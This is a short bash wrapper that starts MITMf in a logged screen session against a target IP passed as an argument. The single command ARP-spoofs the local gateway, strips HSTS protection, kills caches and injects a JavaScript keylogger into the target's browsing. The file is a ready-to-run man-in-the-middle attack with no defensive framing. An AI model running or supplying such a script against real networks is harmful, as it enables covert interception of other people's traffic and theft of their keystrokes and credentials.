#!/bin/bash

cd
screen -LS mitmf-$1 mitmf --interface wlan0 --jskeylogger --cachekill --spoof --arp --hsts --gateway 192.168.1.1 --target $1


